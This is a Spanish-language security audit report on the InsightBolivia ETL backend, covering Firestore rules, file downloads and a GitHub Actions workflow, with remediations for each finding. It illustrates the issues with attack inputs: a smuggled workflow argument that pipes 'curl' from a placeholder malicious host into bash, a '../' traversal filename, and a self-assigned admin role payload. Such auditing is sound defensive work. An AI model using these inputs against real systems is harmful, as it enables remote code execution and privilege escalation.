# Informe de Auditoría de Seguridad y Calidad Backend (V1)
**Proyecto:** InsightBolivia  
**Componente:** Backend, Pipelines ETL, Data Warehouse (BigQuery) y Cloud Firestore  
**Fecha de Evaluación:** Octubre 2026  
**Auditor:** Antigravity Senior Security & Backend Lead  
**Estado General:** ACEPTABLE CON OBSERVACIONES CRÍTICAS (Severidad Media-Alta focalizada en Reglas NoSQL y CI/CD)

---

## 1. Resumen Ejecutivo y Postura de Seguridad

Se ha realizado una auditoría exhaustiva de seguridad y arquitectura defensiva sobre el backend de **InsightBolivia**, evaluando el orquestador ETL (`src/`), las integraciones con Google Cloud (`BigQuery`, `Cloud Firestore`), los flujos de CI/CD (`.github/workflows/`), y la suite de pruebas unitarias (`tests/`).

### Indicadores Clave de Seguridad (KPIs)
| Indicador | Resultado | Estado |
| :--- | :---: | :---: |
| **Vulnerabilidades en Dependencias (SCA)** | **0 CVEs** (`pip-audit`) | ✅ Óptimo |
| **Análisis Estático de Seguridad (SAST)** | **0 Errores / 0 Warnings** (`ruff` + Bandit `S`) | ✅ Óptimo |
| **Cobertura de Pruebas Unitarias** | **98.58%** (748/748 tests pasados) | ✅ Óptimo |
| **Gestión de Secretos y Credenciales** | 0 credenciales hardcodeadas, `.gitignore` estricto | ✅ Óptimo |
| **Reglas de Seguridad Cloud Firestore** | 1 Crítica (Escalamiento de Privilegios), 1 Alta (DoS/Spam) | ⚠️ Requiere Remediación |
| **Seguridad en Ingestión HTTP / Archivos** | 1 Media (Path Traversal en Content-Disposition) | ⚠️ Requiere Remediación |
| **Seguridad en CI/CD (GitHub Actions)** | 1 Media (Inyección de Comandos en Workflow) | ⚠️ Requiere Remediación |

---

## 2. Resultados de Herramientas Automatizadas (SCA / SAST)

### 2.1 Software Composition Analysis (SCA) — `pip-audit`
Se auditó la totalidad del árbol de dependencias resuelto en `uv.lock`:
```
Command: uv run pip-audit
Result: No known vulnerabilities found
Scanned Packages: pandas, polars, requests, pydantic, pyyaml, google-cloud-bigquery,
                  google-cloud-firestore, firebase-admin, great-expectations,
                  streamlit, plotly, wbgapi, etc.
```

### 2.2 Static Application Security Testing (SAST) — `ruff check .`
Se validaron todas las reglas de calidad PEP 8 y seguridad de Bandit (`S`):
```
Command: uv run ruff check .
Result: All checks passed! (0 violations)
Audited Modules: src/, streamlit_app/, tests/, config/
```

### 2.3 Cobertura y Suite de Pruebas Unitarias — `pytest --cov`
```
Command: uv run pytest --cov=src --cov=streamlit_app --cov-fail-under=90
Result: 748 passed in 42.46s | Cobertura Total: 98.58% (Requisito >= 90% cumplido)
```

---

## 3. Hallazgos Técnicos y Vulnerabilidades Identificadas

### 🔴 HALLAZGO BK-01: Escalamiento de Privilegios en Reglas de Firestore (RBAC Bypass)
- **Severidad:** CRÍTICA (CVSS 8.8)
- **CWE:** CWE-269 (Improper Privilege Management), CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP API Security:** API5:2023 - Broken Function Level Authorization
- **Ubicación:** `firestore/rules/firestore.rules` (líneas 16-22, 31-34)
- **Descripción:**
  Las reglas de seguridad de Firestore para la colección `user_profiles/{userId}` definen:
  ```javascript
  function getUserRole() {
    return get(/databases/$(database)/documents/user_profiles/$(request.auth.uid)).data.role;
  }
  function isAdmin() {
    return isAuthenticated() && getUserRole() == 'admin';
  }
  match /user_profiles/{userId} {
    allow read: if isAuthenticated() && (request.auth.uid == userId || isAdmin());
    allow write: if isAuthenticated() && (request.auth.uid == userId || isAdmin());
  }
  ```
  Dado que `allow write` engloba `create`, `update` y `delete`, un usuario legítimamente autenticado con rol `viewer` puede enviar una solicitud de actualización a su propio documento (`/user_profiles/<su_uid>`) con el payload `{"role": "admin"}`. Inmediatamente después, `getUserRole()` devolverá `"admin"` y `isAdmin()` evaluará a `true`, otorgándole acceso administrativo total a toda la base de datos Firestore.
- **Impacto:** Compromiso total de la confidencialidad, integridad y disponibilidad del catálogo DWH, logs de auditoría y perfiles de usuario.
- **Remediación:**
  1. Desacoplar el rol administrativo del documento de usuario editable por el cliente.
  2. Impedir que el campo `role` sea modificado por el usuario si no es admin, o utilizar **Firebase Custom Claims** (`request.auth.token.role == 'admin'`).
  3. En su defecto, aplicar validación estricta en las reglas:
  ```javascript
  match /user_profiles/{userId} {
    allow read: if isAuthenticated() && (request.auth.uid == userId || isAdmin());
    allow create: if isAuthenticated() && request.auth.uid == userId && request.resource.data.role == 'viewer';
    allow update: if isAuthenticated() && (
      isAdmin() ||
      (request.auth.uid == userId && request.resource.data.role == resource.data.role)
    );
    allow delete: if isAdmin();
  }
  ```

---

### 🟠 HALLAZGO BK-02: Creación No Autenticada en Logs y Analítica (Denegación de Servicio / Cost Bomb)
- **Severidad:** ALTA (CVSS 7.3)
- **CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-770 (Allocation of Resources Without Limits)
- **OWASP API Security:** API4:2023 - Unrestricted Resource Consumption
- **Ubicación:** `firestore/rules/firestore.rules` (líneas 47-60)
- **Descripción:**
  Las colecciones `audit_log` y `ui_analytics` tienen permitida la creación pública e irrestricta:
  ```javascript
  match /audit_log/{logId} {
    allow create: if true;
  }
  match /ui_analytics/{eventId} {
    allow create: if true;
  }
  ```
  Cualquier agente externo sin autenticar puede inundar estas colecciones con escrituras masivas o documentos de hasta 1 MB, agotando la cuota diaria gratuita de Firestore (20,000 escrituras/día) en minutos y generando costos imprevistos o bloqueo del servicio.
- **Remediación:**
  1. Si `ui_analytics` y `audit_log` son generados exclusivamente desde el backend de Streamlit o los scripts ETL, **no deben estar expuestos al cliente web**. Dado que Streamlit corre con Service Account, este se salta las reglas de Firestore; por lo tanto, `allow create: if false;` puede ser configurado si no hay clientes cliente-side (móvil/SPA) escribiendo directamente.
  2. Si se requiere ingesta desde clientes, exigir autenticación anónima mínima (`request.auth != null`) y validación de tamaño de payload (`request.resource.data.keys().size() < 10`).

---

### 🟡 HALLAZGO BK-03: Posible Path Traversal en Extracción de Archivos (Content-Disposition Header)
- **Severidad:** MEDIA (CVSS 5.9)
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-73 (External Control of File Name or Path)
- **Ubicación:** `src/extract_comercio_exterior.py` (líneas 280-286, 360)
- **Descripción:**
  La función `_extract_filename_from_response` extrae el nombre sugerido del encabezado `Content-Disposition`:
  ```python
  match = re.search(r'filename\*?=(?:UTF-8\'\')?["\']?([^";\n]+)["\']?', cd_header, re.IGNORECASE)
  if match:
      raw_name = match.group(1).strip()
      decoded = urllib.parse.unquote(raw_name)
      if decoded:
          return decoded
  ```
  Y luego en `download_resource`:
  ```python
  final_path = dest_dir / filename
  ```
  Si el servidor remoto (o un atacante mediante Man-in-the-Middle o DNS spoofing) devuelve `Content-Disposition: attachment; filename="../../tmp/malicious.py"`, `dest_dir / filename` resuelve fuera de `dest_dir`.
- **Remediación:**
  Sanitizar el nombre extrayendo exclusivamente el componente base:
  ```python
  from pathlib import Path
  safe_filename = Path(decoded).name
  ```
  Y validar que no contenga caracteres nulos ni secuencias de escape.

---

### 🟡 HALLAZGO BK-04: Riesgo de Inyección de Comandos en Workflow de GitHub Actions
- **Severidad:** MEDIA (CVSS 6.1)
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
- **OWASP Top 10 CI/CD:** CICD-SEC-04 - Untrusted Input in Actions
- **Ubicación:** `.github/workflows/etl_comercio_exterior.yml` (línea 94)
- **Descripción:**
  En el step `Execute ETL Pipeline Sequence`:
  ```bash
  if [ -n "${{ inputs.date_range }}" ]; then
    ARGS="$ARGS --date-range ${{ inputs.date_range }}"
  fi
  ```
  La expresión `${{ inputs.date_range }}` se expande como texto crudo en el script bash antes de su ejecución. Si un usuario con permisos de ejecución manual ingresa un valor como `2024; curl https://malicious.site | bash`, se ejecutarán comandos arbitrarios en el runner de GitHub Actions.
- **Remediación:**
  Inyectar los inputs a través de variables de entorno del step:
  ```yaml
  env:
    INPUT_DATE_RANGE: ${{ inputs.date_range }}
    INPUT_OPERATION: ${{ inputs.operation }}
  run: |
    if [ -n "$INPUT_DATE_RANGE" ]; then
      ARGS="$ARGS --date-range $INPUT_DATE_RANGE"
    fi
  ```

---

## 4. Revisión de Codificación Segura (OWASP Best Practices)

### A. Gestión de Secretos y Control de Acceso
- ✅ **Cero Credenciales en Código**: Verificado. No existen API keys, Service Account JSON ni tokens hardcodeados en el repositorio.
- ✅ **Control de Versiones Defensivo**: `.gitignore` incluye reglas rigurosas (`*.json`, `*.env`, `.streamlit/secrets.toml`, `.gcp/`, etc.). Se comprobó el historial de Git y no existen fugas pasadas.

### B. Inyección SQL y BigQuery
- ✅ **Consultas Parametrizadas**: El pipeline ETL y los componentes de extracción (`src/load_comercio_exterior.py`, `src/extract_benchmark.py`) utilizan `bigquery.QueryJobConfig(query_parameters=[...])` con `bigquery.ScalarQueryParameter` y `ArrayQueryParameter`.
- ✅ **Particionamiento y Clustering**: `fact_comercio_exterior` y `fact_indicadores_bm` están correctamente particionadas por fecha y clusterizadas, evitando sobrecostos y escaneos completos involuntarios.

### C. Validación de Entradas y Calidad de Datos
- ✅ **Great Expectations y Pydantic**: Las estructuras de datos están fuertemente tipadas y validadas con Pydantic v2 en `src/config.py` y `src/firestore_models.py`.
- ✅ **Control de Integridad Física**: `src/validate.py` valida no negatividad, consistencia de pesos (`peso_bruto >= peso_neto`), umbral de nulos (< 5%) y tipos de cambio oficiales.

---

## 5. Plan de Acción y Recomendaciones de Remediación

1. **Inmediato (P0):** Corregir las reglas de Firestore en `firestore/rules/firestore.rules` para bloquear la autoasignación del rol `admin` y restringir la creación anónima de logs.
2. **Corto Plazo (P1):** Sanitizar `filename` en `src/extract_comercio_exterior.py` con `Path(filename).name` para prevenir Path Traversal.
3. **Corto Plazo (P1):** Refactorizar `.github/workflows/etl_comercio_exterior.yml` pasando `inputs` a través de variables de entorno `env:`.
4. **Mantenimiento (P2):** Agregar regla de análisis continuo de dependencias con `pip-audit` en el pre-commit o hook local.
